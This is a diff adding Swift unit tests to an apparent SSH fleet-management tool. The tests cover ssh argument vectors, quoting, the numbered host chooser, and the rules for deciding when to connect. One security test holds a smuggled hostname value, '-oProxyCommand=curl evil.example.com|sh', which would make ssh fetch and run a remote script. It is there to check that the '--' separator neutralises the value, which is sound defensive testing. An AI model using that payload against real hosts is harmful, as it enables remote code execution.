@@ -189,3 +189,192 @@ final class SSHLoginTests: XCTestCase {
             "starting over has to mean the probe can run again")
     }
 }
+
+/// The argument vector `ssh` actually receives, and what a typed answer to
+/// "which of these?" means.
+final class SSHVectorTests: XCTestCase {
+
+    private func arguments(_ target: String, user: String? = nil,
+                           key: String? = nil, managed: Bool = true) -> [String] {
+        SSHCommand.arguments(target: target, user: user, identityFile: key,
+                             managedByConfig: managed)
+    }
+
+    func testArgv0IsTheProgram() {
+        XCTAssertEqual(arguments("web-1").first, "ssh")
+    }
+
+    func testAManagedHostGetsNoFlags() {
+        XCTAssertEqual(arguments("web-1"), ["ssh", "--", "web-1"])
+    }
+
+    /// ssh_config already carries the user and the key for a host Hangar wrote,
+    /// so spelling them out again would override the file.
+    func testAManagedHostIgnoresUserAndKey() {
+        XCTAssertEqual(arguments("web-1", user: "rocky", key: "~/k.pem"),
+                       ["ssh", "--", "web-1"])
+    }
+
+    func testAnUnmanagedHostSpellsOutUserAndKey() {
+        XCTAssertEqual(arguments("web.example.com", user: "rocky", key: "~/k.pem",
+                                 managed: false),
+                       ["ssh", "-i", "~/k.pem", "--", "rocky@web.example.com"])
+    }
+
+    func testAnUnmanagedHostWithoutALoginIsJustTheHost() {
+        XCTAssertEqual(arguments("web.example.com", managed: false),
+                       ["ssh", "--", "web.example.com"])
+    }
+
+    /// Mistake 9. A hostname tag beginning with a hyphen is read as an option
+    /// wherever it reaches an argument vector, and ProxyCommand is code ssh runs.
+    /// An argument vector does not prevent that. `--` does.
+    func testTheTargetIsAlwaysBehindADoubleHyphen() {
+        for managed in [true, false] {
+            let vector = arguments("-oProxyCommand=curl evil.example.com|sh",
+                                   managed: managed)
+            let separator = try? XCTUnwrap(vector.firstIndex(of: "--"))
+            let target = try? XCTUnwrap(
+                vector.firstIndex(of: "-oProxyCommand=curl evil.example.com|sh"))
+            XCTAssertNotNil(separator)
+            XCTAssertNotNil(target)
+            if let separator, let target { XCTAssertLessThan(separator, target) }
+        }
+    }
+
+    /// The line and the vector are the same decision rendered twice, so a panel
+    /// and a shell cannot disagree about which user or key a host gets.
+    func testTheLineAndTheVectorAgree() {
+        for managed in [true, false] {
+            let vector = SSHCommand.arguments(target: "web.example.com", user: "rocky",
+                                              identityFile: "~/k.pem",
+                                              managedByConfig: managed)
+            let line = SSHCommand.line(target: "web.example.com", user: "rocky",
+                                       identityFile: "~/k.pem",
+                                       managedByConfig: managed)
+            // Every element appears in the line, in order, quoted or not.
+            var remaining = Substring(line)
+            for element in vector {
+                guard let found = remaining.range(of: element) else {
+                    return XCTFail("'\(element)' is not in '\(line)'")
+                }
+                remaining = remaining[found.upperBound...]
+            }
+        }
+    }
+
+    /// Only what came from outside is quoted, or the line is unreadable.
+    func testTheLineQuotesValuesAndNotFlags() {
+        XCTAssertEqual(SSHCommand.line(target: "web 1", user: nil, identityFile: "~/k.pem",
+                                       managedByConfig: false),
+                       "ssh -i '~/k.pem' -- 'web 1'")
+    }
+
+    // MARK: - Choosing
+
+    func testANumberInRangeIsAnIndex() {
+        XCTAssertEqual(Chooser.choice("1", count: 3), 0)
+        XCTAssertEqual(Chooser.choice("3", count: 3), 2)
+        XCTAssertEqual(Chooser.choice(" 2 ", count: 3), 1)
+    }
+
+    /// Cancelling is the easy answer, because this is about to open a session on
+    /// somebody's production host.
+    func testAnythingElseCancels() {
+        XCTAssertNil(Chooser.choice("", count: 3))
+        XCTAssertNil(Chooser.choice(nil, count: 3))          // EOF
+        XCTAssertNil(Chooser.choice("0", count: 3))
+        XCTAssertNil(Chooser.choice("4", count: 3))
+        XCTAssertNil(Chooser.choice("-1", count: 3))
+        XCTAssertNil(Chooser.choice("yes", count: 3))
+        XCTAssertNil(Chooser.choice("1 2", count: 3))
+    }
+
+    func testNothingToChooseFromChoosesNothing() {
+        XCTAssertNil(Chooser.choice("1", count: 0))
+    }
+}
+
+/// The rule that decides whether a command opens a session on a host nobody
+/// named, and the pairing between what the chooser prints and what it reads.
+final class ConnectDecisionTests: XCTestCase {
+
+    func testNothingMatchedConnectsToNothing() {
+        XCTAssertEqual(ConnectDecision.decide(matches: 0, takeFirst: false, canAsk: true),
+                       .none)
+        XCTAssertEqual(ConnectDecision.decide(matches: 0, takeFirst: true, canAsk: false),
+                       .none)
+    }
+
+    func testOneMatchConnectsWithoutAsking() {
+        XCTAssertEqual(ConnectDecision.decide(matches: 1, takeFirst: false, canAsk: true),
+                       .connect(index: 0))
+        XCTAssertEqual(ConnectDecision.decide(matches: 1, takeFirst: false, canAsk: false),
+                       .connect(index: 0))
+    }
+
+    func testSeveralAskWhenThereIsSomebodyToAsk() {
+        XCTAssertEqual(ConnectDecision.decide(matches: 4, takeFirst: false, canAsk: true),
+                       .ask)
+    }
+
+    /// The case a script or an agent hits. Having a host picked for it is what
+    /// `| head -1` was doing quietly.
+    func testSeveralWithNobodyToAskRefuses() {
+        XCTAssertEqual(ConnectDecision.decide(matches: 4, takeFirst: false, canAsk: false),
+                       .tooMany(hosts: 4))
+    }
+
+    func testFirstSkipsTheQuestionEitherWay() {
+        XCTAssertEqual(ConnectDecision.decide(matches: 9, takeFirst: true, canAsk: true),
+                       .connect(index: 0))
+        XCTAssertEqual(ConnectDecision.decide(matches: 9, takeFirst: true, canAsk: false),
+                       .connect(index: 0))
+    }
+
+    // MARK: - What it prints and what it reads
+
+    private func entries(_ count: Int) -> [SearchEntry] {
+        (1...count).map {
+            SearchEntry(instance: Fixture.instance(["product": "payments",
+                                                    "env": "prod"],
+                                                   id: "i-\($0)"),
+                        alias: "web-\($0)")
+        }
+    }
+
+    /// The one pairing where an off-by-one opens a session on the wrong host:
+    /// every label the list prints must select the host printed beside it.
+    func testEveryPrintedLabelSelectsTheHostBesideIt() {
+        let hosts = entries(4)
+        let lines = FleetOutput.numbered(hosts, terminal: .plain)
+            .split(separator: "\n").map(String.init)
+        XCTAssertEqual(lines.count, hosts.count)
+
+        for (line, host) in zip(lines, hosts) {
+            let label = line.trimmingCharacters(in: .whitespaces)
+                .prefix { $0.isNumber }
+            let index = Chooser.choice(String(label), count: hosts.count)
+            XCTAssertEqual(index.map { hosts[$0].alias }, host.alias,
+                           "label \(label) does not select \(host.alias)")
+        }
+    }
+
+    func testTheListIsNumberedFromOne() {
+        let text = FleetOutput.numbered(entries(3), terminal: .plain)
+        XCTAssertTrue(text.hasPrefix("  1  "), text)
+        XCTAssertFalse(text.contains("  0  "))
+    }
+
+    func testANonRunningHostSaysSoInTheChooser() {
+        var stopped = Fixture.instance(["product": "payments"], state: "stopped")
+        stopped.tags["hostname"] = "web.example.com"
+        let text = FleetOutput.numbered([SearchEntry(instance: stopped, alias: "web-1")],
+                                        terminal: .plain)
+        XCTAssertTrue(text.contains("stopped"))
+    }
+
+    func testTheChooserPrintsNothingForNoHosts() {
+        XCTAssertEqual(FleetOutput.numbered([], terminal: .plain), "")
+    }
+}
